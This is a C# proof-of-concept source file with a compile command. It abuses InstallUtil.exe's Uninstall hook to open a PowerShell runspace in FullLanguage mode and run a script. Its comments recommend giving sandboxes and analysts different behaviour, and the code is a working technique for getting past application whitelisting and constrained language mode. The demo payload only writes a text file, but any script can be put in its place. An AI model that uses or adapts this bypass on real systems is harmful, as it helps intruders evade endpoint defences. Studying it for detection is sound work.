using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices;              
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;             
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;


public class Program
{
                public static void Main()
                {
                                Console.WriteLine("Hey There From Main()");
                                //Add any behavior here to throw off sandbox execution/analysts :)
                                //These binaries can exhibit one behavior when executed in sandbox, and entirely different one when invoked 
                                //by InstallUtil.exe
                                Console.WriteLine("Hello from mail.");
                                
                }
                
}


[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
                //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
                public override void Uninstall(System.Collections.IDictionary savedState)
                {
                
                    InitialSessionState iss = InitialSessionState.CreateDefault();
                    iss.LanguageMode = PSLanguageMode.FullLanguage;
                    Runspace runspace = RunspaceFactory.CreateRunspace(iss);
                    runspace.Open();
                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
                    Pipeline pipeline = runspace.CreatePipeline();
                     
                    //Interrogate LockDownPolicy
                    //Console.WriteLine(System.Management.Automation.Security.SystemPolicy.GetSystemLockdownPolicy());                
                     
                    //Add commands
                    pipeline.Commands.AddScript("write-output 'hello there' | out-file c:\temp\test123.txt");


                    //Prep PS for string output and invoke
                    //pipeline.Commands.Add("Out-String");
                    Collection<PSObject> results = pipeline.Invoke();
                    runspace.Close();
                    Console.WriteLine("Hello There From Uninstall, If you are reading this, prevention has failed.");
                                
                }               
}

C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /r:System.EnterpriseServices.dll /r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /r:C:\Windows\assembly\GAC_MSIL\Microsoft.Build.Framework\3.5.0.0__b03f5f7f11d50a3a\Microsoft.Build.Framework.dll /r:C:\Windows\assembly\GAC_MSIL\Microsoft.Build.Utilities.v3.5\3.5.0.0__b03f5f7f11d50a3a\Microsoft.Build.Utilities.v3.5.dll /out:executePowerShell.exe executePowerShell.cs
